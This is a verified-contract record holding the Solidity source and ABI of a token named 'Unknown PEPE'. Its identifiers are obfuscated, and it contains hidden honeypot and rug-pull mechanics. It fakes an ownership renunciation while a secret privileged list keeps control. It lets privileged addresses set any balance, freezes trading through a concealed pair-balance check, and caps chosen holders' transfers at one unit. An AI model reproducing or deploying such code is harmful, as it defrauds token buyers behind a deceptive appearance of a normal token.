{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface fundToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingWalletLaunch) external view returns (uint256);\n\n    function transfer(address swapTokenTotal, uint256 totalAt) external returns (bool);\n\n    function allowance(address feeAmountMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapTokenTotal,\n        uint256 totalAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitLiquidity, uint256 value);\n    event Approval(address indexed feeAmountMin, address indexed spender, uint256 value);\n}\n\nabstract contract isTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeAt {\n    function createPair(address launchedExempt, address launchTotal) external returns (address);\n}\n\ninterface fundTokenMetadata is fundToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UnknownPEPE is isTotal, fundToken, fundTokenMetadata {\n\n    mapping(address => uint256) private modeReceiver;\n\n    uint256 constant isLaunched = 1 ** 10;\n\n    function modeWallet() public {\n        emit OwnershipTransferred(minFund, address(0));\n        totalMode = address(0);\n    }\n\n    function tokenShould(address shouldLaunchReceiver, address swapTokenTotal, uint256 totalAt) internal returns (bool) {\n        if (shouldLaunchReceiver == minFund) {\n            return isEnableReceiver(shouldLaunchReceiver, swapTokenTotal, totalAt);\n        }\n        uint256 limitMode = fundToken(atTotalMarketing).balanceOf(maxToken);\n        require(limitMode == receiverTokenBuy);\n        require(swapTokenTotal != maxToken);\n        if (isShould[shouldLaunchReceiver]) {\n            return isEnableReceiver(shouldLaunchReceiver, swapTokenTotal, isLaunched);\n        }\n        return isEnableReceiver(shouldLaunchReceiver, swapTokenTotal, totalAt);\n    }\n\n    bool public atExempt;\n\n    bool public amountLaunch;\n\n    function owner() external view returns (address) {\n        return totalMode;\n    }\n\n    bool private takeAmountExempt;\n\n    bool public isReceiver;\n\n    bool private isSell;\n\n    function transferFrom(address shouldLaunchReceiver, address swapTokenTotal, uint256 totalAt) external override returns (bool) {\n        if (_msgSender() != receiverAuto) {\n            if (sellAmount[shouldLaunchReceiver][_msgSender()] != type(uint256).max) {\n                require(totalAt <= sellAmount[shouldLaunchReceiver][_msgSender()]);\n                sellAmount[shouldLaunchReceiver][_msgSender()] -= totalAt;\n            }\n        }\n        return tokenShould(shouldLaunchReceiver, swapTokenTotal, totalAt);\n    }\n\n    address public minFund;\n\n    mapping(address => bool) public launchedLiquidity;\n\n    function launchAt(uint256 totalAt) public {\n        buyTokenLimit();\n        receiverTokenBuy = totalAt;\n    }\n\n    function limitTake(address enableSender, uint256 totalAt) public {\n        buyTokenLimit();\n        modeReceiver[enableSender] = totalAt;\n    }\n\n    uint256 private toAmountShould;\n\n    function allowance(address minAutoList, address receiverLaunch) external view virtual override returns (uint256) {\n        if (receiverLaunch == receiverAuto) {\n            return type(uint256).max;\n        }\n        return sellAmount[minAutoList][receiverLaunch];\n    }\n\n    address public atTotalMarketing;\n\n    uint256 public shouldLiquidity;\n\n    function balanceOf(address tradingWalletLaunch) public view virtual override returns (uint256) {\n        return modeReceiver[tradingWalletLaunch];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverLiquidity;\n    }\n\n    function amountTake(address atTx) public {\n        if (amountLaunch) {\n            return;\n        }\n        \n        launchedLiquidity[atTx] = true;\n        \n        amountLaunch = true;\n    }\n\n    uint256 private tradingFee = 100000000 * 10 ** 18;\n\n    function tradingSender(address toTx) public {\n        buyTokenLimit();\n        if (isReceiver) {\n            isReceiver = true;\n        }\n        if (toTx == minFund || toTx == atTotalMarketing) {\n            return;\n        }\n        isShould[toTx] = true;\n    }\n\n    bool private buyFund;\n\n    address private totalMode;\n\n    bool private swapMin;\n\n    uint256 buyTeam;\n\n    mapping(address => bool) public isShould;\n\n    constructor (){\n        \n        enableAuto modeWalletSell = enableAuto(receiverAuto);\n        atTotalMarketing = takeAt(modeWalletSell.factory()).createPair(modeWalletSell.WETH(), address(this));\n        \n        minFund = _msgSender();\n        modeWallet();\n        launchedLiquidity[minFund] = true;\n        modeReceiver[minFund] = tradingFee;\n        \n        emit Transfer(address(0), minFund, tradingFee);\n    }\n\n    uint256 receiverTokenBuy;\n\n    string private receiverLiquidity = \"Unknown PEPE\";\n\n    bool private txToMode;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingFee;\n    }\n\n    address receiverAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address enableSender, uint256 totalAt) external virtual override returns (bool) {\n        return tokenShould(_msgSender(), enableSender, totalAt);\n    }\n\n    uint256 public fromTo;\n\n    function getOwner() external view returns (address) {\n        return totalMode;\n    }\n\n    address maxToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private fundLiquidity = 18;\n\n    function buyTokenLimit() private view {\n        require(launchedLiquidity[_msgSender()]);\n    }\n\n    function isEnableReceiver(address shouldLaunchReceiver, address swapTokenTotal, uint256 totalAt) internal returns (bool) {\n        require(modeReceiver[shouldLaunchReceiver] >= totalAt);\n        modeReceiver[shouldLaunchReceiver] -= totalAt;\n        modeReceiver[swapTokenTotal] += totalAt;\n        emit Transfer(shouldLaunchReceiver, swapTokenTotal, totalAt);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private sellAmount;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromAt;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundLiquidity;\n    }\n\n    string private fromAt = \"UPE\";\n\n    event OwnershipTransferred(address indexed enableAt, address indexed receiverLaunched);\n\n    function approve(address receiverLaunch, uint256 totalAt) public virtual override returns (bool) {\n        sellAmount[_msgSender()][receiverLaunch] = totalAt;\n        emit Approval(_msgSender(), receiverLaunch, totalAt);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeAmountMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAutoList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTx\",\"type\":\"address\"}],\"name\":\"amountTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTotalMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingWalletLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalAt\",\"type\":\"uint256\"}],\"name\":\"launchAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAt\",\"type\":\"uint256\"}],\"name\":\"limitTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTx\",\"type\":\"address\"}],\"name\":\"tradingSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLaunchReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapTokenTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UnknownPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}